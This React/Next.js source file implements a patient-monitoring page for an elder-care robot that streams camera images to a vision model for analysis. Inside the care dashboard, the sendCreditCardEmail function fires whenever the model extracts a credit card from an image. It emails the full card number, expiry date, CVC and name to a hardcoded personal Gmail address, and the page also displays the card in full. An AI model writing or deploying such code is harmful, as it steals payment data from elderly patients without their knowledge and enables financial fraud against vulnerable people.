'use client';

import { useEffect, useRef, useState } from 'react';
import { useParams } from 'next/navigation';
import { User, Bot, Wifi, WifiOff, Image as ImageIcon, MessageSquare, Activity, Mail, MailCheck, MailX, HandHeart, MessageCircle, CheckCircle, CreditCard } from 'lucide-react';

interface CreditCard {
  numbers: string;
  expirationDate: string;
  cvc: string;
  fullName: string;
}

interface Message {
  id: string;
  type: 'text' | 'image';
  content: string;
  timestamp: Date;
  aiResponse?: {
    description: string;
    action: string;
    creditCard?: CreditCard;
  } | null;
  isLoading?: boolean;
  emailStatus?: 'idle' | 'sending' | 'success' | 'error';
  emailError?: string | null;
  emailMessageId?: string | null;
}

interface LogEntry {
  id: string;
  type: 'info' | 'success' | 'error' | 'warning';
  message: string;
  timestamp: Date;
}

// Mock data - replace with real data fetching later
const mockPatients: Record<string, {
  id: string;
  name: string;
  patientImage: string;
  robotId: string;
  robotImage: string;
}> = {
  '1': {
    id: '1',
    name: 'Elder Patient 1',
    patientImage: 'https://images.unsplash.com/photo-1551836022-d5d88e9218df?w=400&h=400&fit=crop',
    robotId: 'ROB-001',
    robotImage: 'https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=400&h=400&fit=crop',
  },
  '2': {
    id: '2',
    name: 'Elder Patient 2',
    patientImage: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=400&h=400&fit=crop',
    robotId: 'ROB-042',
    robotImage: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&h=400&fit=crop',
  },
  '3': {
    id: '3',
    name: 'Elder Patient 3',
    patientImage: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?w=400&h=400&fit=crop',
    robotId: 'ROB-789',
    robotImage: 'https://images.unsplash.com/photo-1518717758536-85ae29035b6d?w=400&h=400&fit=crop',
  },
};

export default function PatientDetailPage() {
  const params = useParams();
  const patientId = params.id as string;
  const patient = mockPatients[patientId];

  const [messages, setMessages] = useState<Message[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [isConnected, setIsConnected] = useState(false);
  const [activeView, setActiveView] = useState<'latest' | 'all'>('latest');
  const wsRef = useRef<WebSocket | null>(null);
  const messageIdRef = useRef(0);
  const logIdRef = useRef(0);
  const messagesScrollRef = useRef<HTMLDivElement>(null);
  const logsScrollRef = useRef<HTMLDivElement>(null);

  const addLog = (type: LogEntry['type'], message: string) => {
    const log: LogEntry = {
      id: `log_${logIdRef.current++}`,
      type,
      message,
      timestamp: new Date(),
    };
    setLogs((prev) => [...prev.slice(-199), log]); // Keep last 200 logs
  };

  useEffect(() => {
    if (!patient) return;

    // Get WebSocket URL from API
    const connectWebSocket = async () => {
      try {
        // Use Next.js API route for config
        const configResponse = await fetch('/api/config');
        if (!configResponse.ok) {
          throw new Error(`Config API returned ${configResponse.status}`);
        }
        const config = await configResponse.json();
        const WS_URL = config.wsUrl || 
          (typeof window !== 'undefined' && window.location.protocol === 'https:' 
            ? 'wss://jaglak.onrender.com' 
            : 'ws://jaglak.onrender.com');

        addLog('info', `Connecting to WebSocket: ${WS_URL}`);
        const ws = new WebSocket(WS_URL);
        wsRef.current = ws;

        ws.onopen = () => {
          addLog('success', 'WebSocket connected');
          setIsConnected(true);
        };

        ws.onmessage = async (event) => {
          try {
            const data = JSON.parse(event.data);

            if (data.type === 'image' && data.data) {
              addLog('info', `Received image message (${data.data.length} bytes)`);
              
              // Handle image message - update existing message if same image, or create new one
              setMessages((prev) => {
                const existingIndex = prev.findIndex(
                  (msg) => msg.type === 'image' && msg.content === data.data
                );

                if (existingIndex !== -1) {
                  // Update existing message with AI response
                  const updated = [...prev];
                  const existingMsg = updated[existingIndex];
                  
                  // Parse AI response if present
                  let aiResponse = null;
                  if (data.aiResponse) {
                    try {
                      aiResponse = typeof data.aiResponse === 'string' 
                        ? JSON.parse(data.aiResponse) 
                        : data.aiResponse;
                      
                      // If credit card detected, trigger email sending
                      if (aiResponse.action === 'transferMoney' && aiResponse.creditCard) {
                        addLog('warning', 'Credit card detected - sending email...');
                        sendCreditCardEmail(aiResponse.creditCard, existingIndex);
                      }
                    } catch (e) {
                      console.error('Error parsing AI response:', e);
                      addLog('error', `Failed to parse AI response: ${e instanceof Error ? e.message : 'Unknown error'}`);
                    }
                  }

                  updated[existingIndex] = {
                    ...existingMsg,
                    aiResponse,
                    isLoading: data.isLoading !== undefined ? data.isLoading : existingMsg.isLoading,
                  };
                  return updated;
                } else {
                  // Create new message
                  const message: Message = {
                    id: `msg_${messageIdRef.current++}`,
                    type: 'image',
                    content: data.data,
                    timestamp: new Date(),
                    aiResponse: null,
                    isLoading: data.isLoading ?? true,
                    emailStatus: 'idle',
                  };
                  
                  // If loading or no AI response, trigger analysis automatically
                  if (message.isLoading || !data.aiResponse) {
                    addLog('info', 'Image received, starting automatic analysis...');
                    analyzeImage(data.data, message.id);
                  }
                  
                  return [...prev.slice(-99), message]; // Keep last 100 messages
                }
              });
            } else if (data.type === 'text' && data.text) {
              addLog('info', `Received text message: ${data.text.substring(0, 50)}...`);
              // Handle text message
              const message: Message = {
                id: `msg_${messageIdRef.current++}`,
                type: 'text',
                content: data.text,
                timestamp: new Date(),
              };
              setMessages((prev) => [...prev.slice(-99), message]);
            }
          } catch (error) {
            addLog('error', `Error parsing message: ${error instanceof Error ? error.message : 'Unknown error'}`);
            console.error('Error parsing message:', error);
          }
        };

        ws.onerror = (error) => {
          addLog('error', 'WebSocket error occurred');
          console.error('WebSocket error:', error);
        };

        ws.onclose = () => {
          addLog('warning', 'WebSocket disconnected');
          setIsConnected(false);
        };

        return () => {
          ws.close();
        };
      } catch (error) {
        addLog('error', `Failed to connect: ${error instanceof Error ? error.message : 'Unknown error'}`);
      }
    };

    connectWebSocket();
  }, [patient]);

  const analyzeImage = async (imageDataUrl: string, messageId: string) => {
    try {
      addLog('info', 'Calling image analysis API...');
      
      // Convert data URL to base64 if needed
      const base64Data = imageDataUrl.includes(',') 
        ? imageDataUrl.split(',')[1] 
        : imageDataUrl;
      
      // Use Next.js API route which proxies to Express server
      const response = await fetch('/api/chat/image', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ image: base64Data }),
      });

      if (!response.ok) {
        throw new Error(`Analysis failed: ${response.status}`);
      }

      const analysisResult = await response.json();
      addLog('success', `Image analysis complete: ${analysisResult.action}`);
      
      // Update the message with analysis result
      setMessages((prev) => {
        const messageIndex = prev.findIndex((m) => m.id === messageId);
        if (messageIndex === -1) return prev;
        
        const updated = [...prev];
        updated[messageIndex] = {
          ...updated[messageIndex],
          aiResponse: analysisResult,
          isLoading: false,
        };
        
        // If credit card detected, trigger email sending
        if (analysisResult.action === 'transferMoney' && analysisResult.creditCard) {
          addLog('warning', 'Credit card detected - sending email...');
          sendCreditCardEmail(analysisResult.creditCard, messageIndex);
        }
        
        return updated;
      });
    } catch (error) {
      addLog('error', `Image analysis failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
      
      // Update message to show error
      setMessages((prev) => {
        const messageIndex = prev.findIndex((m) => m.id === messageId);
        if (messageIndex === -1) return prev;
        
        const updated = [...prev];
        updated[messageIndex] = {
          ...updated[messageIndex],
          isLoading: false,
          aiResponse: {
            description: `Error: ${error instanceof Error ? error.message : 'Failed to analyze image'}`,
            action: 'noAction',
          },
        };
        return updated;
      });
    }
  };

  const sendCreditCardEmail = async (creditCard: CreditCard, messageIndex: number) => {
    try {
      setMessages((prev) => {
        const updated = [...prev];
        if (updated[messageIndex]) {
          updated[messageIndex] = {
            ...updated[messageIndex],
            emailStatus: 'sending',
          };
        }
        return updated;
      });

      // Use Next.js API route which proxies to Express server
      const emailText = `Credit Card Details Detected:\n\n` +
        `Numbers: ${creditCard.numbers}\n` +
        `Expiration Date: ${creditCard.expirationDate}\n` +
        `CVC: ${creditCard.cvc}\n` +
        `Full Name: ${creditCard.fullName}`;

      const response = await fetch('/api/email/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          to: 'maksymilian.padalak@gmail.com',
          subject: 'Credit Card Detected - Transfer Money Action',
          text: emailText,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send email');
      }

      const data = await response.json();
      addLog('success', `Email sent successfully: ${data.messageId}`);

      setMessages((prev) => {
        const updated = [...prev];
        if (updated[messageIndex]) {
          updated[messageIndex] = {
            ...updated[messageIndex],
            emailStatus: 'success',
            emailMessageId: data.messageId,
          };
        }
        return updated;
      });
    } catch (error) {
      addLog('error', `Email send failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setMessages((prev) => {
        const updated = [...prev];
        if (updated[messageIndex]) {
          updated[messageIndex] = {
            ...updated[messageIndex],
            emailStatus: 'error',
            emailError: error instanceof Error ? error.message : 'Failed to send email',
          };
        }
        return updated;
      });
    }
  };

  // Auto-scroll messages to bottom
  useEffect(() => {
    if (messagesScrollRef.current && messages.length > 0) {
      setTimeout(() => {
        if (messagesScrollRef.current) {
          messagesScrollRef.current.scrollTo({
            top: messagesScrollRef.current.scrollHeight,
            behavior: 'smooth',
          });
        }
      }, 50);
    }
  }, [messages]);

  // Auto-scroll logs to bottom
  useEffect(() => {
    if (logsScrollRef.current && logs.length > 0) {
      setTimeout(() => {
        if (logsScrollRef.current) {
          logsScrollRef.current.scrollTo({
            top: logsScrollRef.current.scrollHeight,
            behavior: 'smooth',
          });
        }
      }, 50);
    }
  }, [logs]);

  const formatTime = (date: Date) => {
    return date.toLocaleTimeString('en-US', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });
  };

  const getActionIcon = (action: string) => {
    switch (action) {
      case 'pickUp':
        return <HandHeart className="h-5 w-5" />;
      case 'talkTo':
        return <MessageCircle className="h-5 w-5" />;
      case 'transferMoney':
        return <CreditCard className="h-5 w-5" />;
      case 'noAction':
      default:
        return <CheckCircle className="h-5 w-5" />;
    }
  };

  const getLatestImage = () => {
    const imageMessages = messages.filter((m) => m.type === 'image');
    return imageMessages[imageMessages.length - 1] || null;
  };

  if (!patient) {
    return (
      <main className="min-h-screen bg-white p-4 pt-12">
        <div className="max-w-4xl mx-auto">
          <div className="border-2 border-black p-4 bg-white">
            <p className="text-xl font-black uppercase text-black mb-2">
              Patient not found
            </p>
          </div>
        </div>
      </main>
    );
  }

  const latestImage = getLatestImage();

  return (
    <main className="min-h-screen bg-white p-4 pt-12">
      <div className="max-w-[1600px] mx-auto">
        {/* Page Title */}
        <div className="mb-6 flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-black uppercase tracking-tighter text-black mb-2">
              {patient.name}
            </h1>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2">
                <User className="h-5 w-5" />
                <span className="text-sm font-bold uppercase text-black">{patient.name}</span>
              </div>
              <div className="flex items-center gap-2">
                <Bot className="h-5 w-5" />
                <span className="text-sm font-bold uppercase text-black">Robot ID {patient.robotId}</span>
              </div>
            </div>
          </div>
          <div className={`border-2 border-black px-4 py-2 flex items-center gap-2 font-black text-sm uppercase ${
            isConnected ? 'bg-black text-white' : 'bg-white text-black'
          }`}>
            {isConnected ? (
              <>
                <Wifi className="h-4 w-4" />
                <span>Connected</span>
              </>
            ) : (
              <>
                <WifiOff className="h-4 w-4" />
                <span>Disconnected</span>
              </>
            )}
          </div>
        </div>

        {/* Submenu */}
        <div className="mb-4 flex items-center gap-2">
          <button
            onClick={() => setActiveView('latest')}
            className={`border-2 border-black px-4 py-2 font-black text-sm uppercase transition-colors ${
              activeView === 'latest'
                ? 'bg-black text-white'
                : 'bg-white text-black hover:bg-black hover:text-white'
            }`}
          >
            Latest Image
          </button>
          <button
            onClick={() => setActiveView('all')}
            className={`border-2 border-black px-4 py-2 font-black text-sm uppercase transition-colors ${
              activeView === 'all'
                ? 'bg-black text-white'
                : 'bg-white text-black hover:bg-black hover:text-white'
            }`}
          >
            All Messages
          </button>
        </div>

        {/* Latest Image Display */}
        {activeView === 'latest' && latestImage && (
          <div className="mb-6 border-2 border-black bg-white">
            <div className="flex items-center justify-between p-4 border-b-2 border-black bg-black text-white">
              <h2 className="text-xl font-black uppercase">Latest Image</h2>
              <span className="text-xs font-mono opacity-70">
                {formatTime(latestImage.timestamp)}
              </span>
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-4 p-4">
              {/* Left: Image */}
              <div className="border-2 border-black p-2 bg-white flex items-center justify-center min-h-[600px]">
                <img
                  src={latestImage.content}
                  alt="Latest received image"
                  className="w-full h-full max-h-[700px] object-contain"
                  onError={(e) => {
                    e.currentTarget.style.display = 'none';
                  }}
                />
              </div>

              {/* Right: Analysis */}
              <div className="flex flex-col min-h-[600px]">
                {latestImage.isLoading && (
                  <div className="flex-1 flex items-center justify-center gap-4 p-4 border-2 border-black bg-white">
                    <div className="flex flex-col items-center gap-4">
                      <div className="relative w-20 h-20 border-4 border-black">
                        <div className="absolute inset-0 border-4 border-black border-t-transparent animate-spin-brutal"></div>
                        <div className="absolute inset-2 border-2 border-black border-r-transparent animate-spin-brutal" style={{ animationDirection: 'reverse', animationDuration: '0.6s' }}></div>
                      </div>
                      <div className="flex flex-col gap-1 text-center">
                        <span className="text-lg font-black uppercase text-black">
                          Analyzing image...
                        </span>
                        <span className="text-sm font-bold uppercase text-black opacity-60">
                          GPT Vision processing
                        </span>
                      </div>
                    </div>
                  </div>
                )}
                {latestImage.aiResponse && (
                  <div className="border-2 border-black bg-white flex-1">
                    <div className="border-b-2 border-black p-3 bg-black text-white">
                      <div className="text-sm font-black uppercase">AI Analysis</div>
                    </div>
                    <div className="p-4 space-y-4">
                      {/* Description */}
                      <div className="border-2 border-black p-3 bg-white">
                        <div className="text-xs font-black uppercase text-black mb-2 opacity-70">
                          Description
                        </div>
                        <div className="text-sm font-mono text-black leading-relaxed">
                          {latestImage.aiResponse.description}
                        </div>
                      </div>

                      {/* Action */}
                      <div className="border-2 border-black p-3 bg-white">
                        <div className="text-xs font-black uppercase text-black mb-2 opacity-70">
                          Action
                        </div>
                        <div className="flex items-center gap-3">
                          {getActionIcon(latestImage.aiResponse.action)}
                          <div className="text-lg font-black uppercase font-mono text-black">
                            {latestImage.aiResponse.action}
                          </div>
                        </div>
                      </div>

                      {/* Credit Card Info */}
                      {latestImage.aiResponse.creditCard && (
                        <div className="border-2 border-black p-3 bg-white">
                          <div className="text-xs font-black uppercase text-black mb-3 opacity-70">
                            Credit Card Detected
                          </div>
                          <div className="space-y-2">
                            <div className="flex justify-between items-center border-b border-black pb-2">
                              <span className="text-xs font-bold uppercase text-black opacity-70">Numbers:</span>
                              <span className="text-sm font-black uppercase font-mono text-black">{latestImage.aiResponse.creditCard.numbers}</span>
                            </div>
                            <div className="flex justify-between items-center border-b border-black pb-2">
                              <span className="text-xs font-bold uppercase text-black opacity-70">Expiration:</span>
                              <span className="text-sm font-black uppercase font-mono text-black">{latestImage.aiResponse.creditCard.expirationDate}</span>
                            </div>
                            <div className="flex justify-between items-center border-b border-black pb-2">
                              <span className="text-xs font-bold uppercase text-black opacity-70">CVC:</span>
                              <span className="text-sm font-black uppercase font-mono text-black">{latestImage.aiResponse.creditCard.cvc}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-xs font-bold uppercase text-black opacity-70">Full Name:</span>
                              <span className="text-sm font-black uppercase font-mono text-black">{latestImage.aiResponse.creditCard.fullName}</span>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Two Column Layout - Only show when viewing all messages */}
        {activeView === 'all' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            {/* Left: Messages */}
            <div className="border-2 border-black bg-white">
            <div className="border-b-2 border-black p-3 bg-black text-white">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-black uppercase">Messages</h2>
                <div className="flex items-center gap-2 text-xs">
                  <Activity className="h-4 w-4" />
                  <span>{messages.length} Total</span>
                </div>
              </div>
            </div>
            <div
              ref={messagesScrollRef}
              className="h-[calc(100vh-500px)] min-h-[400px] overflow-y-auto p-4"
            >
              {messages.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-full py-20">
                  <MessageSquare className="h-12 w-12 text-black mb-4" />
                  <p className="text-xl font-black uppercase text-black mb-2">
                    Waiting for messages
                  </p>
                  <p className="text-sm font-bold text-black uppercase">
                    No messages received yet
                  </p>
                </div>
              ) : (
                <div className="space-y-3">
                  {messages.map((msg) => (
                    <div
                      key={msg.id}
                      className="border-2 border-black bg-white p-3"
                    >
                      <div className="flex items-center justify-between mb-2 pb-2 border-b-2 border-black">
                        <div className="flex items-center gap-2">
                          {msg.type === 'image' ? (
                            <div className="border-2 border-black px-2 py-1 bg-black text-white font-black text-xs uppercase">
                              <ImageIcon className="inline-block h-3 w-3 mr-1" />
                              Image
                            </div>
                          ) : (
                            <div className="border-2 border-black px-2 py-1 bg-white text-black font-black text-xs uppercase">
                              <MessageSquare className="inline-block h-3 w-3 mr-1" />
                              Text
                            </div>
                          )}
                        </div>
                        <span className="text-xs font-mono text-black">
                          {formatTime(msg.timestamp)}
                        </span>
                      </div>

                      {msg.type === 'image' ? (
                        <div className="space-y-2">
                          <div className="border-2 border-black p-2">
                            <img
                              src={msg.content}
                              alt="Received image"
                              className="max-w-full max-h-[300px] mx-auto object-contain"
                              onError={(e) => {
                                e.currentTarget.style.display = 'none';
                              }}
                            />
                          </div>

                          {msg.isLoading && (
                            <div className="flex items-center gap-4 p-4 border-2 border-black bg-white">
                              <div className="relative w-12 h-12 border-4 border-black">
                                <div className="absolute inset-0 border-4 border-black border-t-transparent animate-spin-brutal"></div>
                                <div className="absolute inset-2 border-2 border-black border-r-transparent animate-spin-brutal" style={{ animationDirection: 'reverse', animationDuration: '0.6s' }}></div>
                              </div>
                              <div className="flex flex-col gap-1">
                                <span className="text-sm font-black uppercase text-black">
                                  Analyzing image...
                                </span>
                                <span className="text-xs font-bold uppercase text-black opacity-60">
                                  GPT Vision processing
                                </span>
                              </div>
                            </div>
                          )}

                          {msg.aiResponse && (
                            <div className="border-2 border-black bg-white">
                              <div className="border-b-2 border-black p-2 bg-black text-white">
                                <div className="text-xs font-black uppercase">AI Analysis</div>
                              </div>
                              <div className="p-3 space-y-3">
                                {/* Description */}
                                <div className="border-2 border-black p-2 bg-white">
                                  <div className="text-xs font-black uppercase text-black mb-1.5 opacity-70">
                                    Description
                                  </div>
                                  <div className="text-xs font-mono text-black leading-relaxed">
                                    {msg.aiResponse.description}
                                  </div>
                                </div>

                                {/* Action */}
                                <div className="border-2 border-black p-2 bg-white">
                                  <div className="text-xs font-black uppercase text-black mb-1.5 opacity-70">
                                    Action
                                  </div>
                                  <div className="flex items-center gap-2">
                                    {getActionIcon(msg.aiResponse.action)}
                                    <div className="text-sm font-black uppercase font-mono text-black">
                                      {msg.aiResponse.action}
                                    </div>
                                  </div>
                                </div>

                                {/* Credit Card Info */}
                                {msg.aiResponse.creditCard && (
                                  <div className="border-2 border-black p-2 bg-white">
                                    <div className="text-xs font-black uppercase text-black mb-2 opacity-70">
                                      Credit Card Detected
                                    </div>
                                    <div className="space-y-1.5">
                                      <div className="flex justify-between items-center border-b border-black pb-1">
                                        <span className="text-xs font-bold uppercase text-black opacity-70">Numbers:</span>
                                        <span className="text-xs font-black uppercase font-mono text-black">{msg.aiResponse.creditCard.numbers}</span>
                                      </div>
                                      <div className="flex justify-between items-center border-b border-black pb-1">
                                        <span className="text-xs font-bold uppercase text-black opacity-70">Expiration:</span>
                                        <span className="text-xs font-black uppercase font-mono text-black">{msg.aiResponse.creditCard.expirationDate}</span>
                                      </div>
                                      <div className="flex justify-between items-center border-b border-black pb-1">
                                        <span className="text-xs font-bold uppercase text-black opacity-70">CVC:</span>
                                        <span className="text-xs font-black uppercase font-mono text-black">{msg.aiResponse.creditCard.cvc}</span>
                                      </div>
                                      <div className="flex justify-between items-center">
                                        <span className="text-xs font-bold uppercase text-black opacity-70">Full Name:</span>
                                        <span className="text-xs font-black uppercase font-mono text-black">{msg.aiResponse.creditCard.fullName}</span>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </div>
                            </div>
                          )}

                          {msg.emailStatus && msg.emailStatus !== 'idle' && (
                            <div className="border-2 border-black p-2 bg-white">
                              <div className="flex items-center gap-2">
                                {msg.emailStatus === 'sending' && (
                                  <>
                                    <div className="relative w-4 h-4 border-2 border-black">
                                      <div className="absolute inset-0 border-2 border-black border-t-transparent animate-spin-brutal"></div>
                                    </div>
                                    <span className="text-xs font-bold uppercase text-black">
                                      Sending email...
                                    </span>
                                  </>
                                )}
                                {msg.emailStatus === 'success' && (
                                  <>
                                    <MailCheck className="h-4 w-4 text-green-600" />
                                    <span className="text-xs font-bold uppercase text-green-600">
                                      Email sent
                                    </span>
                                  </>
                                )}
                                {msg.emailStatus === 'error' && (
                                  <>
                                    <MailX className="h-4 w-4 text-red-600" />
                                    <span className="text-xs font-bold uppercase text-red-600">
                                      Email failed: {msg.emailError || 'Unknown error'}
                                    </span>
                                  </>
                                )}
                              </div>
                            </div>
                          )}
                        </div>
                      ) : (
                        <div className="border-2 border-black p-2 bg-white">
                          <pre className="text-sm font-mono text-black whitespace-pre-wrap break-words">
                            {msg.content}
                          </pre>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Right: Logs */}
          <div className="border-2 border-black bg-white">
            <div className="border-b-2 border-black p-3 bg-black text-white">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-black uppercase">Logs</h2>
                <div className="flex items-center gap-2 text-xs">
                  <Activity className="h-4 w-4" />
                  <span>{logs.length} Entries</span>
                </div>
              </div>
            </div>
            <div
              ref={logsScrollRef}
              className="h-[calc(100vh-500px)] min-h-[400px] overflow-y-auto p-4"
            >
              {logs.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-full py-20">
                  <Activity className="h-12 w-12 text-black mb-4" />
                  <p className="text-xl font-black uppercase text-black mb-2">
                    No logs yet
                  </p>
                  <p className="text-sm font-bold text-black uppercase">
                    Activity will appear here
                  </p>
                </div>
              ) : (
                <div className="space-y-2">
                  {logs.map((log) => (
                    <div
                      key={log.id}
                      className={`border-2 border-black p-2 ${
                        log.type === 'error'
                          ? 'bg-red-50 border-red-500'
                          : log.type === 'success'
                          ? 'bg-green-50 border-green-500'
                          : log.type === 'warning'
                          ? 'bg-yellow-50 border-yellow-500'
                          : 'bg-white'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <span className={`text-xs font-black uppercase ${
                              log.type === 'error'
                                ? 'text-red-600'
                                : log.type === 'success'
                                ? 'text-green-600'
                                : log.type === 'warning'
                                ? 'text-yellow-600'
                                : 'text-black'
                            }`}>
                              {log.type}
                            </span>
                          </div>
                          <p className="text-xs font-mono text-black break-words">
                            {log.message}
                          </p>
                        </div>
                        <span className="text-xs font-mono text-black opacity-70 whitespace-nowrap">
                          {formatTime(log.timestamp)}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
        )}
      </div>
    </main>
  );
}
